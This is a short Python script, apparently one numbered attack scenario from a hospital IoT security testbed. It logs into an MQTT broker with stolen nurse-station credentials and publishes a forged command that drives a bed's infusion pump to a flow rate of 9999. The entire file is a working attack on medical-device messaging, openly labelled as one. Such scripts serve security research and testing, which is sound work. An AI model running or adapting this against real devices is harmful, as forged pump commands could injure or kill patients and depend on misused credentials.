import os
import json
import time
import paho.mqtt.client as mqtt

BROKER = "broker"
PORT = 1883
# Attacker uses stolen nurse station credentials to bypass ACL restrictions
STOLEN_USERNAME = "nurse-station"
STOLEN_PASSWORD = os.environ.get("MQTT_PASS_NURSE_STATION", "change-me")
TARGET_BED = "bed1"

print(f"[*] Starting Attack 8: Forged Pump Command against {TARGET_BED}")

# Setup MQTT Client
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id="malicious_actor_01")
client.username_pw_set(STOLEN_USERNAME, STOLEN_PASSWORD)

client.connect(BROKER, PORT, 60)
client.loop_start()

#a pause to let connection finish opening
time.sleep(1)

# Malicious payload: force the pump to maximum flow rate
malicious_payload = json.dumps({"new_rate": 9999})
target_topic = f"ward1/{TARGET_BED}/pump/command"

print(f"[*] Injecting payload to {target_topic}: {malicious_payload}")
client.publish(target_topic, malicious_payload)

time.sleep(2)
client.loop_stop()
print("[+] Attack complete.")